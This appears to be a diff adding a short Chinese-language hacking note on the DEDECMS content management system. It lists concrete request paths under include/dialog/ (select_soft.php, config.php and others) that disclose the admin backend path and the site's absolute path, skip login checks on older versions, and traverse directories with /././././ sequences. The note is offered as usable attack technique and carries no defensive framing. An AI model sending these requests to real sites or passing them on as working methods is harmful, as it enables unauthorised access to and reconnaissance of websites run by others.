@@ -1,0 +1,13 @@
+1.include/dialog/select_soft.php文件可以爆出DEDECMS的后台,以前的老板本可以跳过登陆验证直接访问,无需管理
+员帐号,新版本的就直接转向了后台.
+2.include/dialog/config.php会爆出后台管理路径
+3.include/dialog/select_soft.php?activepath=/include/FCKeditor 跳转目录
+4.include/dialog/select_soft.php?activepath=/st0pst0pst0pst0pst0pst0pst0pst0p 爆出网站绝对路径.
+5.另外一些低版本的DEDECMS访问这个页面的时候会直接跳过登陆验证,直接显示,而且还可以用/././././././././掉
+到根目录去.不过这些版本的访问地址有些不同.
+地址为require/dialog/select_soft.php?activepath=/././././././././
+include\dialog\目录下的另外几个文件都存在同一个问题,只是默认设的目录不同.有些可以查看HTML这些文件哦..
+存在相同问题的文件还有
+include\dialog\select_images.php
+include\dialog\select_media.php
+include\dialog\select_templets.php
